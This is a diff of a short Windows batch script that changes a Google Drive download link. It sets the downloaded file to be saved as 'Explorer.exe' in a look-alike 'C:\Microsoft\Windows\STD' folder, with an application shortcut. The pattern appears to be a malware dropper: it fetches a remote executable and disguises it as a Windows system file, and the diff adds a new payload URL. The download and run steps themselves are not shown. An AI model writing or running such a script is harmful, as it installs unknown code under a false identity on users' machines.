@@ -1,6 +1,6 @@
 @echo off
 REM Define variables
-set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1gtZX_JRPP6eEenXQn9kHl8jNKebSO0m1&export=download&authuser=0&confirm=t&uuid=277d89af-1d62-45e8-9394-a95d2887aa69&at=AENtkXapwsMfuoQwzXzqzFCIwTFo%3A1733262679635"
+set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1AXQr8nvYhe-bsimmCj1xligne_xKkwCn&export=download&authuser=1&confirm=t&uuid=60d7f482-2db6-4e83-be3f-6d220abfd35b&at=AENtkXYbwNRQCSpy2eu83p4rSsIh:1733264599875"
 set "destinationFolder=C:\Microsoft\Windows\STD"
 set "destinationFileName=Explorer.exe"  REM Change as needed
 set "shortcutName=MyApplication.lnk"
